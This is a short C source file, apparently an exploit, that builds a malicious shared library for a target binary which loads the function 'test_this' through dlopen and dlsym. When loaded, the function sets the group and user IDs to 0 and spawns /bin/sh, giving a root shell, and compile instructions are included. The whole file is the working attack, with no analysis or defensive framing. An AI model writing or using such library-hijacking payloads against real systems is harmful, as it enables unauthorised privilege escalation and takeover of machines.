// target binary loads shared object with function "test_this"
// it used dlopen and dlsym

//compile: gcc -o lib.so -fPIC -shared -nostartfiles expl.c

#include <unistd.h>
#include <stdio.h>

void test_this() {
    printf("Function test_this is running!\n");
    setgid(0);
    setuid(0);
    execl("/bin/sh","sh",0);
}
